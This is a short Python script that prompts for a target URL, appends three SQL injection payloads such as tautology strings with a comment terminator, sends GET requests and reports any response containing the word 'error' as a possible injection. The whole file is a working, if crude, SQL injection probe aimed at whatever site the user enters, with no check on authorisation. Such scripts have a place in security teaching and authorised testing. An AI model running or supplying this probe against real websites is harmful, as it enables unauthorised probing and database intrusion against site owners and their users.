import requests

# Ask the user for the target URL
target_url = input("Enter the target URL (e.g., http://example.com/vulnerable.php?id=): ")

# List of SQL injection payloads to test
payloads = ["1' OR '1'='1", "1' OR '1'='2", "1' OR '1'='1' -- "]

# Iterate through payloads and send requests
for payload in payloads:
    # Construct the full URL with the payload
    url = target_url + payload

    # Send a GET request to the URL
    response = requests.get(url)

    # Check the response for signs of SQL injection
    if "error" in response.text:
        print(f"Potential SQL Injection detected with payload: {payload}")
